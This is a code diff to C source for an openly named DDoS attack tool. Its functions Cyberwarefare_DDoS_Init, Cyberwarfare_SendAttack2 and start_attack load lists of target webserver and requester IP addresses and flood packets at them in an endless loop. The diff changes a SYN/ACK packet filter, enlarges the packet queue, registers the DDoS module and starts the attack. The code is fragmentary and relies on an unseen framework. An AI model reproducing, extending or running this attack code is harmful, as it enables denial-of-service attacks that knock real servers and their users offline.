@@ -341,12 +341,14 @@ int Cyberwarefare_DDoS_Init(AS_context *ctx) {
     // lets prepare incoming ICMP processing for our traceroutes
     if ((flt = (FilterInformation *)calloc(1, sizeof(FilterInformation))) == NULL) goto end;
 
-    // empty filter.. we want everything.
+    // initialize w empty filter.. we want everything.
     FilterPrepare(flt, 0, 0);
 
-    // lets specify SYN/ACK for filter..
-    flt->flags |= FILTER_PACKET_FLAGS;
-    flt->packet_flags |= TCP_FLAG_SYN|TCP_FLAG_ACK;
+    // now lets change the filter...
+    // lets specify SYN/ACK for filter.. its not in the API yet.. it was added last
+    // ill just do it manually like this
+    //flt->flags |= FILTER_PACKET_FLAGS;
+    //flt->packet_flags |= TCP_FLAG_SYN|TCP_FLAG_ACK;
 
     // clear other hooks
     ctx->IncomingPacketFunctions = NULL;
@@ -435,6 +437,7 @@ int Cyberwarfare_SendAttack2(AS_context *ctx, PacketBuildInstructions *iptr) {
     // the packet access...
     bptr->data = strdup(req_data);
     bptr->data_size = req_data_size;
+    //bptr->data_` = 1;
 
     // put in queue for wire
     NetworkQueueInstructions(ctx, bptr, &optr);
@@ -473,13 +476,16 @@ end:;
 void start_attack(AS_context *ctx) {
     char *tags[] = { "A1", "00", NULL };
     int web_i = 0, req_i = 0, start = 0, count = 0;
-    IPAddresses *webservers = IPAddressesPtr(ctx, tags[0]);
-    IPAddresses *requesters = IPAddressesPtr(ctx, tags[1]);
+    IPAddresses *webservers = NULL;
+    IPAddresses *requesters = NULL; 
     int ts = 0;
     OutgoingPacketQueue *optr = NULL;
     int fast = 1;
     int skip = 0;
     int out_count = 0;
+
+    webservers = IPAddressesPtr(ctx, tags[0]);
+    requesters = IPAddressesPtr(ctx, tags[1]);
 
     while (1) {
         ts = time(0);
@@ -490,7 +496,11 @@ void start_attack(AS_context *ctx) {
                     if (fast) {//} && out_count++ > 100) {
                         OutgoingQueueLink(ctx, optr);
                         AS_perform(ctx);
-                        network_process_incoming_buffer(ctx);
+
+                        // this SHOULDNT add too much overhead.. since it only processes whats waiting (not reading for more)...
+                        // ill test somme more without it and  see if it hurts/helps
+                        //network_process_incoming_buffer(ctx);
+
                         optr = NULL;
                         //out_count = 0;
                     }
@@ -542,15 +552,6 @@ int main(int argc, char *argv[]) {
         exit(-1);
     }
 
-    ctx->http_discovery_enabled = 0;
-
-    ctx->queue_buffer_size = 1024*100;
-
-
-    Module_Add(ctx, &Cyberwarefare_DDoS_Init, NULL);
-
-    //Antisurveillance_Begin(ctx);
-
     // open and turn both files into IPaddress lists
     i = 0;
     while (files[i] != NULL) {
@@ -559,8 +560,9 @@ int main(int argc, char *argv[]) {
         // if it failed.. bad=1
         if (r <= 0) { 
             printf("failedd to load %s [%s]\n", tag[i], files[i]);
-            bad = 1; break;
-            }
+            bad = 1;
+            break;
+        }
 
         i++;
     }
@@ -570,13 +572,14 @@ int main(int argc, char *argv[]) {
         exit(-1);
     }
 
-/*
-    // now its time to begin the attack.. 
-    if (pthread_create(&attack_thread_handle, NULL, attack_thread, (void *)ctx) != 0) {
-        fprintf(stderr, "cannot start threads\n");
-        exit(-1);
-    }
-*/
+    ctx->queue_buffer_size = 1024*1024;
+    ctx->queue_max_packets = 100;
+
+
+    Module_Add(ctx, &Cyberwarefare_DDoS_Init, NULL);
+
+
+
     printf("beginning attack..\n");
 
     start_attack(ctx);
